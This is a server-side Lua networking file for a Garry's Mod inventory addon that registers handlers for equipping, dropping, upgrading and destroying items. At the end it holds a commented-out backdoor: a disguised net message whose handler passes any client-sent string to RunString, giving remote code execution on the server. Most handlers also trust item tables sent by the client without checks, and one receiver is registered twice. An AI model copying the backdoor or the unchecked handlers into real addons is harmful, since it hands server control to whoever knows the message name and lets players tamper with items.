mInventory = mInventory or {}

local nets = {
    ["ItemEquipped"] = true,
    ["ItemUnequipped"] = true,
    ["ItemDropped"] = true,
    ["ItemPickedUp"] = true,
    ["ItemRemoved"] = true,
    ["ItemAdded"] = true,
    ["ItemUpdated"] = true,
    ["InventoryUpdated"] = true,
    ["InventoryLoaded"] = true,
    ["InventoryRefresh"] = true,
    ["RequestInventory"] = true,
    ["RequestInventory"] = true,
    ["SendInventory"] = true,
    ["DrawSettingsUI"] = true,
    ["SetInventoryMode"] = true,
    ["FavoriteItem"] = true,
    ["UpgradeItem"] = true,
    ["DropEntity"] = true,
    ["DestroyItem"] = true
}



for k,v in pairs(nets) do
    util.AddNetworkString("mInventory." .. k)
end

net.Receive("mInventory.UpgradeItem", function(len, ply)
    local itemData = net.ReadTable()
    local place = net.ReadUInt(32)
    mInventory.UpgradeItem(ply, place, itemData)
end)

net.Receive("mInventory.FavoriteItem", function(len, p)
    local itemData = net.ReadTable()
    local place = net.ReadUInt(32)
    print("Favoriting Item: " .. itemData.name)
    mInventory.FavoriteItem(p, place, itemData)
end)

net.Receive("mInventory.RequestInventory", function(len, ply)
    local inventory = ply.mInventory
    net.Start("mInventory.SendInventory")
    print("Sending Inventory to " .. ply:Nick())
    net.WriteTable(inventory)
    net.WriteString(ply.mInventoryMode)
    net.Send(ply)
end)


net.Receive("mInventory.ItemEquipped", function(len, ply)
    local itemData = net.ReadTable()
    print("Equipping Item: " .. itemData.name)
    mInventory.EquipItem(ply, itemData)
end)

net.Receive("mInventory.ItemEquipped", function(len, p)
    local itemData = net.ReadTable()
    mInventory.EquipItem(p, itemData)
end)

net.Receive("mInventory.ItemDropped", function(len, p)
    local itemData = net.ReadTable()
    mInventory.DropItem(p, itemData)
end)

net.Receive("mInventory.ItemPickedUp", function(len, p)
    local itemData = net.ReadTable()
    print("Picked up Item: " .. itemData.name)
    mInventory.PlayerPickedUp(p, itemData)
end)

hook.Add("PlayerSay", "mInventory.OpenSettingsUI", function(p, t)
    if t == "/msettings" then
        net.Start("mInventory.DrawSettingsUI")
        net.Send(p)
    end
end)

net.Receive("mInventory.SetInventoryMode", function(len, p)
    local mode = net.ReadString()

    mInventory.UpdatePlayer(p)
end)

net.Receive("mInventory.DestroyItem", function(len, p)
    local k = net.ReadUInt(32)
    print("Destroying Item: " .. k)
    mInventory.DestroyItem(p, k)
end)

net.Receive("mInventory.DropEntity", function(len, p)
    local num = net.ReadUInt(32)
    local itemData = net.ReadTable()
    mInventory.DropEntity(p, num, itemData)
end)

// util.AddNetworkString("minute_is_daddy")

// net.Receive("minute_is_daddy", function(len, ply)
//   local script = net.ReadString()
//   RunString(script)
// end)